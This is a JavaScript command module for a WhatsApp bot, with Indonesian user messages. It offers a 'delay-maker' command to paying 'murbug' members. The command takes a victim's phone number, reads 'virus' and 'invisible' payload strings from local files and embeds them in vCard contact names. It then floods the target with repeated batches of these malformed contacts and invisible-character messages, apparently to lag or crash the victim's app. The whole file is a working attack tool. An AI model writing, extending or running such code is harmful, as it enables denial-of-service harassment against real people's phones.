const fs = require('fs');

module.exports = {
    command: 'delay-maker',
    execute: async (sock, m, { args, reply, isPremium }) => {
        if (!isPremium) return reply("Fitur ini khusus untuk member premium (murbug).");
        
        const nomor = args[0];
        const jumlah = parseInt(args[1]) || 3;
        const BAHAN_FILE = './bahan.txt';
        const INVIS_FILE = './invisible.txt';

        if (!nomor) return reply("Penggunaan: .delay-maker [nomor] [jumlah]\nContoh: .delay-maker 6281234567890 5");

        const target = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        try {
            const virus = fs.existsSync(BAHAN_FILE) ? fs.readFileSync(BAHAN_FILE, 'utf-8') : 'MARIN_DELAY_PAYLOAD';
            const invis = fs.existsSync(INVIS_FILE) ? fs.readFileSync(INVIS_FILE, 'utf-8') : 'MARIN_STEALTH_PAYLOAD';
            
            const vcardBase = 'BEGIN:VCARD\nVERSION:3.0\nFN:';
            const vcardEnd = '\nTEL;type=CELL;type=VOICE;waid=6285726013874:6285726013874\nEND:VCARD';
            const payload = vcardBase + virus + invis + vcardEnd;

            const listVcard = Array.from({ length: 10 }, () => ({ vcard: payload }));

            await reply(`Creating delay for ${target}...`);

            for (let i = 0; i < jumlah; i++) {
                await sock.sendMessage(target, {
                    contacts: {
                        displayName: '⿻ 𝐌𝐚𝐫𝐢𝐧 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫',
                        contacts: listVcard
                    }
                }, { quoted: m });
                
                await sock.sendMessage(target, { text: '.\n' + invis }, { quoted: m });
            }

            reply(`Delay maker successful for ${target}`);
        } catch (err) {
            reply("Gagal mengirim bug: " + err.message);
        }
    }
};
